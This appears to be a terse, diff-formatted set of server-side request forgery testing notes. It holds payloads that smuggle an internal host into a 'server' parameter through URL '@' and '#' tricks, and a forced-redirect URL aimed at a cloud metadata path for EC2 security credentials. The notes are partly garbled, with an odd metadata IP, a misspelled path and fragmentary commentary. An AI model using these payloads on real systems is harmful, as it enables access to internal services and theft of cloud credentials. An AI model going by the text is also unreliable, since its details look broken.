@@ -1,0 +1,14 @@
+HTTP body:
+	server=sub.server.asd@§server§#
+	zB 
+	server=stock.store.com
+	to
+	server=stock.store.com@internal-api.store.com#
+
+
+Fuzz link(0xp.cc) list parameters
+if somewhere false DNS response GOOD
+
+
+Force Redirect:
+ssrf.localdomain.pw/custom-30x/?301&url=http://196.254.196.254/lates/meta-data/identity-credentials/ec2/security-credentials/ec-instance&Action=ListTopics&appId=oegw3x
